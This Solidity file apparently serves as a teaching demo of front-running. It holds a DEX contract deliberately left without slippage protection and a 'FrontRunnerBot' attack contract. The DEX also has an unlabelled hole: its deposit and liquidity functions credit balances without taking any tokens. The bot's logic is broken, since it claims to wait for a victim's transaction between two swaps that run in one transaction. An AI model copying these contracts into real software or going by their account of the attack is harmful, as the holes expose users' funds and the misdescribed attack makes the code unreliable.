// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title VulnerableDEX
 * @dev Demonstrates front-running vulnerability in DEX
 * VULNERABILITY: Lack of slippage protection and transaction ordering manipulation
 */
contract VulnerableDEX {
    uint256 public tokenAReserve = 1000000 * 10**18;
    uint256 public tokenBReserve = 1000000 * 10**18;
    uint256 public constant FEE_PERCENT = 3; // 0.3% fee
    
    mapping(address => uint256) public tokenABalance;
    mapping(address => uint256) public tokenBBalance;
    
    event Swap(
        address indexed user,
        uint256 amountIn,
        uint256 amountOut,
        bool isAToB
    );
    event LiquidityAdded(address indexed user, uint256 amountA, uint256 amountB);
    
    /**
     * @dev Add initial liquidity for testing
     */
    function addLiquidity(uint256 amountA, uint256 amountB) external {
        tokenABalance[msg.sender] += amountA;
        tokenBBalance[msg.sender] += amountB;
        tokenAReserve += amountA;
        tokenBReserve += amountB;
        
        emit LiquidityAdded(msg.sender, amountA, amountB);
    }
    
    /**
     * @dev Deposit token A
     */
    function depositTokenA(uint256 amount) external {
        tokenABalance[msg.sender] += amount;
    }
    
    /**
     * @dev Deposit token B
     */
    function depositTokenB(uint256 amount) external {
        tokenBBalance[msg.sender] += amount;
    }
    
    /**
     * @dev VULNERABLE: Swap without slippage protection
     * Front-running possible by monitoring mempool and submitting transaction with higher gas
     */
    function swapAForB(uint256 amountIn) external returns (uint256 amountOut) {
        require(tokenABalance[msg.sender] >= amountIn, "Insufficient balance");
        
        // VULNERABILITY: No slippage protection - user gets whatever the current rate gives
        amountOut = getAmountOut(amountIn, tokenAReserve, tokenBReserve);
        
        require(amountOut > 0, "Insufficient output amount");
        require(tokenBReserve >= amountOut, "Insufficient liquidity");
        
        // Update balances
        tokenABalance[msg.sender] -= amountIn;
        tokenBBalance[msg.sender] += amountOut;
        
        // Update reserves
        tokenAReserve += amountIn;
        tokenBReserve -= amountOut;
        
        emit Swap(msg.sender, amountIn, amountOut, true);
        
        return amountOut;
    }
    
    /**
     * @dev VULNERABLE: Swap without slippage protection
     */
    function swapBForA(uint256 amountIn) external returns (uint256 amountOut) {
        require(tokenBBalance[msg.sender] >= amountIn, "Insufficient balance");
        
        // VULNERABILITY: No slippage protection
        amountOut = getAmountOut(amountIn, tokenBReserve, tokenAReserve);
        
        require(amountOut > 0, "Insufficient output amount");
        require(tokenAReserve >= amountOut, "Insufficient liquidity");
        
        // Update balances
        tokenBBalance[msg.sender] -= amountIn;
        tokenABalance[msg.sender] += amountOut;
        
        // Update reserves
        tokenBReserve += amountIn;
        tokenAReserve -= amountOut;
        
        emit Swap(msg.sender, amountIn, amountOut, false);
        
        return amountOut;
    }
    
    /**
     * @dev Calculate output amount using constant product formula
     * with fee deduction
     */
    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) public pure returns (uint256) {
        require(amountIn > 0, "Insufficient input amount");
        require(reserveIn > 0 && reserveOut > 0, "Insufficient liquidity");
        
        uint256 amountInWithFee = amountIn * (1000 - FEE_PERCENT);
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
        
        return numerator / denominator;
    }
    
    /**
     * @dev Get current price ratio
     */
    function getPrice() external view returns (uint256 priceAInB) {
        return (tokenBReserve * 1e18) / tokenAReserve;
    }
    
    /**
     * @dev Get reserves
     */
    function getReserves() external view returns (uint256, uint256) {
        return (tokenAReserve, tokenBReserve);
    }
}

/**
 * @title FrontRunnerBot
 * @dev Contract to demonstrate front-running attack
 */
contract FrontRunnerBot {
    VulnerableDEX public dex;
    
    constructor(address _dexAddress) {
        dex = VulnerableDEX(_dexAddress);
    }
    
    /**
     * @dev Execute front-running attack
     * 1. Detect victim's transaction in mempool
     * 2. Submit same transaction with higher gas price
     * 3. Execute before victim
     * 4. Profit from price movement
     */
    function frontRunSwap(
        uint256 frontRunAmount,
        uint256 expectedProfit
    ) external returns (uint256) {
        // Deposit tokens
        dex.depositTokenA(frontRunAmount);
        
        // Execute swap before victim (by paying higher gas)
        uint256 amountOut = dex.swapAForB(frontRunAmount);
        
        // Wait for victim's transaction to execute (price changes)
        // Then swap back for profit
        uint256 amountBack = dex.swapBForA(amountOut);
        
        require(amountBack > frontRunAmount + expectedProfit, "Attack failed");
        
        return amountBack - frontRunAmount;
    }
}
